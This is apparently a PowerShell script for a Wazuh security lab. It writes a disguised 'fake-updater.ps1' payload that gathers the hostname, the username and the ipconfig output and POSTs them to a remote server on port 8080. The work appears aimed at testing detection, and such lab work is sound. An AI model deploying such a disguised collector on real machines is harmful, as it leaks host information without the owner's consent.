# ============================================================
# Safe Wazuh Lab - Remote Login Simulation
# Server 2019 -> Windows 10
# ============================================================

# ============================================================
# Create Fake Updater Payload
# Safe Wazuh Lab Simulation
# ============================================================

$LabFolder = "C:\LabShare"

# Create folder if missing
if (-not (Test-Path $LabFolder)) {

    New-Item -Path $LabFolder -ItemType Directory -Force | Out-Null

    Write-Host "Created folder: $LabFolder" -ForegroundColor Green
}

# Create fake payload
@'
$ServerIP = Read-Host "Enter Server 2019 IP Address"

$Data = @"
=== Fake Updater Callback ===
Hostname: $env:COMPUTERNAME
User: $env:USERNAME
Date: $(Get-Date)

IPCONFIG:
$(ipconfig)
"@

Invoke-WebRequest `
    -Uri "http://$ServerIP`:8080/" `
    -Method POST `
    -Body $Data

'@ | Out-File "C:\LabShare\fake-updater.ps1" -Encoding UTF8

Write-Host ""
Write-Host "Payload created successfully:" -ForegroundColor Cyan
Write-Host "C:\LabShare\fake-updater.ps1" -ForegroundColor Yellow
